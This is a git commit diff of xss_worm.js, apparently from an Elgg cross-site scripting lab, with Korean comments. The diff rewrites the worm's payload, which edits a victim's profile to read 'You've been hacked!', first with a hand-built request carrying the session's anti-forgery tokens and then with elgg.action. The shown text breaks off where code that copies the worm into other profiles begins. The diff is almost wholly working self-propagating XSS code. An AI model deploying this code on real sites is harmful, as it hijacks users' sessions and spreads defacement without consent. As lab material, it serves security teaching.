9532ab59f8f5d86bef0ee1285337ba1a880e1d42
MJ <98680218+namminju@users.noreply.github.com>
2024-05-23 04:28:55 +0900

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,16 +1,20 @@
 // 피해자의 프로필을 수정하는 코드
-var userName="&name="+elgg.session.user.name;
-var guid="&guid="+elgg.session.user.guid;
-var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-var token="&__elgg_token="+elgg.security.token.__elgg_token;
 var desc = encodeURIComponent("You've been hacked!"); // 감염된 프로필에 입력될 내용
-var content= "description=" + desc + userName + guid + ts + token; // 요청을 보내는 내용 구성
-var sendurl = "/action/profile/edit"; // 프로필 수정을 위한 URL
-var Ajax=null;
-Ajax=new XMLHttpRequest();
-Ajax.open("POST", sendurl, true);
-Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-Ajax.send(content);
+var content = {
+    description: desc
+};
+
+elgg.action('profile/edit', {
+    data: content,
+    success: function(response) {
+        // 프로필 수정이 성공했을 때 실행되는 코드
+        console.log('Profile updated successfully');
+    },
+    error: function(response) {
+        // 프로필 수정이 실패했을 때 실행되는 코드
+        console.error('Failed to update profile');
+    }
+});
 
 // 웜을 다른 프로필에 복사하여 전파하는 코드
 var wormScript = document.createElement('script');
